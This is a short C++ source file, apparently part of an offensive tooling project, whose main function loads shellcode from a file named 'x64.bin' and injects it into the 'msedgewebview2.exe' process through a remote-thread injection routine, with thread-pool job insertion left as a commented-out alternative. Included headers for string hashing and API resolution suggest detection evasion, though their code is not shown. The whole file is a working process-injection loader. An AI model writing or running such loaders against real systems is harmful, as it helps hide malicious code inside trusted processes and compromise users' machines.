#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <vector>
#include "HashString.h"
#include "CRT.h"
#include "ApiResolve.h"
#include "Injection.h"

#pragma comment(lib, "dbghelp.lib")

#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

int main() {
	LPVOID lpShellcode = nullptr;
	DWORD dwShellcodeSize = 0;
	if (!GetFileDataW(L"x64.bin", &lpShellcode, &dwShellcodeSize)) {
		return -1;
	}

	//RemoteTpJobInsertion(lpShellcode, dwShellcodeSize);
	wchar_t wsName[] = L"msedgewebview2.exe";
	CreateRemoteThreadInject(lpShellcode, dwShellcodeSize, wsName);
}